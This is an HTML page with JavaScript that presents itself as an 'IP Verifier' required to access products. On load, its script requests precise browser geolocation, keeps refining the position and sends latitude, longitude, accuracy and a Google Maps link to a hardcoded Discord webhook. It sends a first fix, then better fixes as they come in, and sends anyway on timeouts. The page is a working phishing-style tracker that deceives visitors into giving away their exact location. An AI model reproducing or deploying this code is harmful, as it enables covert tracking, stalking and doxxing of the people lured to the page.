<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Verifier </title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }
        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
        }
        h1 {
            font-size: 1.5rem;
            color: #1a1a1a;
            margin-bottom: 1rem;
        }
        p {
            color: #666;
            line-height: 1.5;
        }
        #status {
            margin-top: 1rem;
            font-weight: 500;
        }
        .loading {
            color: #007bff;
        }
        .success {
            color: #28a745;
        }
        .error {
            color: #dc3545;
        }
        #accuracy-meter {
            margin-top: 1.5rem;
            padding: 1rem;
            border-radius: 8px;
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            display: none;
        }
        .accuracy-val {
            font-size: 1.2rem;
            font-weight: bold;
            color: #007bff;
        }
        .accuracy-label {
            font-size: 0.9rem;
            color: #6c757d;
        }
        #btn-allow, #btn-force {
            display: none;
            margin-top: 1.5rem;
            padding: 0.8rem 2rem;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        #btn-force {
            background-color: #28a745;
        }
        #btn-allow:hover {
            background-color: #0056b3;
        }
        #btn-force:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>GPS Location Sender</h1>
        <p>Vefrify Your Ip To Acess Our Products </p>
        
        <div id="accuracy-meter">
            <div class="accuracy-label">Current Accuracy</div>
            <div class="accuracy-val" id="current-acc">-- m</div>
            <div class="accuracy-label" id="acc-msg">Finding GPS signal...</div>
        </div>

        <div id="status" class="loading">Requesting location permission...</div>
        
        <button id="btn-allow" onclick="getLocation()">Verify</button>
        <button id="btn-force" onclick="forceSend()">Send  Best </button>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1495485355615453206/ThgzH3LXCyCio83MSyCuVyjbNq8yc3QIkFaOMd1ssEQ1TaMMTJ-yA-gbCtQ38Yxsz3sP';
        let watchId = null;
        let bestPosition = null;
        let isFirstBestSent = false;
        let lastSentAccuracy = Infinity;

        function updateStatus(message, className) {
            const statusDiv = document.getElementById('status');
            const btnAllow = document.getElementById('btn-allow');
            const btnForce = document.getElementById('btn-force');
            const meter = document.getElementById('accuracy-meter');
            
            statusDiv.textContent = message;
            statusDiv.className = className;

            if (className === 'error') {
                btnAllow.style.display = 'inline-block';
                btnForce.style.display = 'none';
                meter.style.display = 'none';
            } else if (className === 'loading') {
                btnAllow.style.display = 'none';
                meter.style.display = 'block';
                if (bestPosition) btnForce.style.display = 'inline-block';
            } else {
                btnAllow.style.display = 'none';
                btnForce.style.display = 'none';
                meter.style.display = 'none';
            }
        }

        function updateAccuracyUI(accuracy) {
            const accVal = document.getElementById('current-acc');
            const accMsg = document.getElementById('acc-msg');
            accVal.textContent = `${accuracy.toFixed(1)} m`;
            
            if (accuracy <= 25) {
                accVal.style.color = '#28a745';
                accMsg.textContent = 'Perfect accuracy found!';
            } else if (accuracy <= 100) {
                accVal.style.color = '#ffc107';
                accMsg.textContent = 'Good signal. Still refining...';
            } else {
                accVal.style.color = '#dc3545';
                accMsg.textContent = 'Weak signal. Move to an open area.';
            }
        }

        async function sendToDiscord(lat, lon, accuracy, type = "Refined") {
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `📍 **[${type}] Location Received**\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Accuracy:** ${accuracy.toFixed(1)} meters\n**Google Maps:** https://www.google.com/maps?q=${lat},${lon}`
                    })
                });

                if (response.ok) {
                    if (type.includes("First")) {
                        updateStatus('First best location sent. Refining further...', 'loading');
                    } else if (type.includes("Final") || type.includes("Manual")) {
                        updateStatus('Final exact location sent!', 'success');
                    } else {
                        updateStatus('Refined location update sent.', 'loading');
                    }
                }
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        function forceSend() {
            if (bestPosition) {
                if (watchId) navigator.geolocation.clearWatch(watchId);
                watchId = null;
                const { latitude, longitude, accuracy } = bestPosition.coords;
                sendToDiscord(latitude, longitude, accuracy, "Manual Force");
            }
        }

        function getLocation() {
            if (!navigator.geolocation) {
                updateStatus('Geolocation is not supported by your browser.', 'error');
                return;
            }

            if (watchId) navigator.geolocation.clearWatch(watchId);
            bestPosition = null;
            isFirstBestSent = false;
            lastSentAccuracy = Infinity;
            document.getElementById('btn-force').style.display = 'none';

            updateStatus('Finding your exact spot... Please wait.', 'loading');

            const options = {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 0
            };

            // Safety fallback: if no good location in 7s, send the best we have as "First Best"
            setTimeout(() => {
                if (!isFirstBestSent && bestPosition) {
                    const { latitude, longitude, accuracy } = bestPosition.coords;
                    isFirstBestSent = true;
                    lastSentAccuracy = accuracy;
                    sendToDiscord(latitude, longitude, accuracy, "First Best Found");
                }
            }, 7000);

            watchId = navigator.geolocation.watchPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    updateAccuracyUI(accuracy);
                    
                    if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                        bestPosition = position;
                        document.getElementById('btn-force').style.display = 'inline-block';
                    }

                    // 1. Wait for accuracy < 60m before sending "First Best"
                    if (!isFirstBestSent && accuracy <= 60) {
                        isFirstBestSent = true;
                        lastSentAccuracy = accuracy;
                        sendToDiscord(latitude, longitude, accuracy, "First Best (Fast)");
                        return;
                    }

                    // 2. If already sent first best, send further improvements (>10m improvement)
                    if (isFirstBestSent) {
                        const improvement = lastSentAccuracy - accuracy;
                        if ((improvement >= 10 || accuracy <= 25) && accuracy < lastSentAccuracy) {
                            lastSentAccuracy = accuracy;
                            
                            if (accuracy <= 25) {
                                navigator.geolocation.clearWatch(watchId);
                                watchId = null;
                                sendToDiscord(latitude, longitude, accuracy, "Final Exact Lock");
                            } else {
                                sendToDiscord(latitude, longitude, accuracy, "Better Accuracy Update");
                            }
                        }
                    }
                },
                (error) => {
                    let errorMessage = 'An unknown error occurred.';
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Please enable "Precise Location" in your browser settings and try again.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'GPS signal not found. Are you indoors?';
                            break;
                        case error.TIMEOUT:
                            if (bestPosition && !isFirstBestSent) {
                                forceSend();
                                return;
                            }
                            errorMessage = 'Verifying Your IP.';
                            break;
                    }
                    updateStatus(errorMessage, 'error');
                },
                options
            );

            // Final fallback after 30s
            setTimeout(() => {
                if (watchId && bestPosition) {
                    const { latitude, longitude, accuracy } = bestPosition.coords;
                    if (accuracy < lastSentAccuracy) {
                        forceSend();
                    } else {
                        navigator.geolocation.clearWatch(watchId);
                        watchId = null;
                        updateStatus('Process completed.', 'success');
                    }
                }
            }, 30000);
        }

        window.onload = getLocation;
    </script>
</body>
</html>
